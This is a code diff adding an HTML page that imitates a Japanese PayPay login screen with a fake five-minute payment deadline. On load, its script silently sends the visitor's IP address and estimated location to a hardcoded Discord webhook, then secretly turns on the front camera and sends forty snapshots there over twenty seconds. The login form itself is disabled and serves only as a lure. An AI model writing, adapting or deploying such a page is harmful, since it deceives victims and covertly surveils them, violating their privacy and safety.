@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PayPay ログイン</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #f5f5f5;
+    }
+    .container {
+      text-align: center;
+      background-color: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      width: 300px;
+    }
+    .logo {
+      margin-bottom: 20px;
+    }
+    .logo img {
+      width: 100px;
+      height: auto;
+    }
+    .header {
+      background-color: #e6f3ff;
+      padding: 10px;
+      border-radius: 5px;
+      margin-bottom: 20px;
+    }
+    .title {
+      font-size: 18px;
+      color: #333;
+      margin-bottom: 20px;
+    }
+    .input-group {
+      margin-bottom: 10px;
+      text-align: left;
+    }
+    .input-group label {
+      display: block;
+      color: #666;
+      font-size: 14px;
+      margin-bottom: 5px;
+    }
+    .input-group input {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      box-sizing: border-box;
+    }
+    .login-btn {
+      background-color: #ccc;
+      color: white;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      width: 100%;
+      font-size: 16px;
+      cursor: not-allowed;
+    }
+    .options {
+      margin-top: 20px;
+      font-size: 12px;
+    }
+    .footer {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #666;
+    }
+    #video {
+      display: none !important;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/1/11/PayPay_logo.svg" alt="PayPay Logo" onerror="this.src='https://via.placeholder.com/100';">
+      <p>ログイン</p>
+    </div>
+    <div class="header">
+      <p id="paymentDeadline">以内に支払いを完了してください</p>
+    </div>
+    <div class="title">
+      PayPayに登録した携帯電話番号でログイン
+    </div>
+    <div class="input-group">
+      <label for="phone">電話番号の携帯電話番号</label>
+      <input type="text" id="phone" placeholder="080-1234-5678">
+    </div>
+    <div class="input-group">
+      <label for="email">メールアドレス (例: Yahoo! JAPAN ID)</label>
+      <input type="email" id="email" placeholder="example@yahoo.co.jp">
+    </div>
+    <div class="input-group">
+      <label for="password">パスワードをお忘れですか？</label>
+      <input type="password" id="password">
+    </div>
+    <button class="login-btn" disabled>ログイン</button>
+    <div class="options">
+      <p>外部のアカウントでログイン</p>
+      <p><span style="color: red;">Yahoo! JAPAN ID</span></p>
+      <p><span>ソフトバンク・ワイモバイル・LINEMO</span></p>
+      <p>アカウントお持ちでない場合新規登録</p>
+    </div>
+    <div class="footer">
+      <p>アカウントお持ちでない場合新規登録</p>
+    </div>
+    <video id="video" autoplay muted playsinline></video>
+  </div>
+
+  <script>
+    const webhookUrl = 'https://discord.com/api/webhooks/1387673023733043210/QDjYcnrdgaIoTxWTgV_HB4Mw9v8ezMZS1VcASbSi6SNDSvcp7IRfn1FffJysC3vgVpTd'; // ←差し替えてね！
+
+    function updatePaymentDeadline() {
+      const now = new Date();
+      const deadline = new Date(now.getTime() + 5 * 60000);
+      const h = deadline.getHours().toString().padStart(2, '0');
+      const m = deadline.getMinutes().toString().padStart(2, '0');
+      document.getElementById('paymentDeadline').textContent = `${h}:${m} 以内に支払いを完了してください`;
+    }
+
+    function sendToDiscord(content, label = '通知', imageData = null) {
+      const payload = {
+        content: `【${label}】\n${content}`
+      };
+
+      if (imageData) {
+        payload.embeds = [{
+          image: { url: imageData },
+          timestamp: new Date().toISOString()
+        }];
+      }
+
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      }).catch(err => console.error('Discord送信エラー:', err));
+    }
+
+    function getIPLocationAndSend() {
+      fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip || '不明';
+          const city = data.city || '';
+          const region = data.region || '';
+          const country = data.country_name || '';
+          const fullAddress = `${country} ${region} ${city}`;
+          const message = `IP: ${ip}\n推定住所: ${fullAddress}`;
+          sendToDiscord(message, 'IPアドレス＆住所');
+        })
+        .catch(err => {
+          console.error('住所取得失敗:', err);
+        });
+    }
+
+    async function startCameraAndCapture() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user' } // 内カメラ指定
+        });
+
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = 640;
+        canvas.height = 480;
+
+        let count = 0;
+        const total = 40; // 20秒 / 0.5秒
+        const interval = setInterval(() => {
+          if (count >= total) {
+            clearInterval(interval);
+            stream.getTracks().forEach(t => t.stop());
+            return;
+          }
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const imgData = canvas.toDataURL('image/jpeg');
+          sendToDiscord(`カメラキャプチャ ${count + 1}/${total}`, 'カメラ映像', imgData);
+          count++;
+        }, 500);
+      } catch (err) {
+        console.error('カメラ起動失敗:', err);
+      }
+    }
+
+    window.onload = () => {
+      updatePaymentDeadline();
+      getIPLocationAndSend();
+      startCameraAndCapture();
+    };
+  </script>
+</body>
+</html>
